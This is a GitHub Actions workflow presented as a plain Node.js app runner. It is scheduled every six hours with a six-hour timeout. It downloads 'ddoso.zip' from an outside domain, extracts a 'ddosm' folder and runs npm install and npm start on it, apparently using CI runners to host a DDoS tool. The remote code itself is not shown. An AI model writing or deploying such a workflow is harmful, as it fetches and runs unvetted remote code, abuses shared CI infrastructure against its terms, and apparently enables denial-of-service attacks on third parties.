name: ğŸš€ Node.js App with npm start

on:
  workflow_dispatch:  # Manual trigger
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours

jobs:
  run-app:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours max
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      
      - name: Download and extract application
        run: |
          wget -q https://reality.mahmud-tech.online/ddoso.zip
          unzip -q ddoso.zip
          echo "ğŸ“ Extracted files:"
          ls -la
      
      - name: Find app directory and run npm start
        run: |
          # List all directories
          echo "ğŸ” Available directories:"
          ls -d */
          
          # Directory is 'ddosm' (all lowercase)
          if [ -d "ddosm" ]; then
            echo "âœ… Found ddosm directory"
            cd ddosm
            echo "ğŸ“ Working directory: $(pwd)"
            echo "ğŸ“„ Directory contents:"
            ls -la
            
            echo ""
            echo "ğŸ“„ package.json contents:"
            cat package.json
            
            echo ""
            echo "ğŸ“¦ Installing dependencies..."
            npm install --legacy-peer-deps
            
            echo ""
            echo "ğŸš€ Running npm start..."
            npm start
          else
            echo "âŒ Directory 'ddosm' not found"
            exit 1
          fi
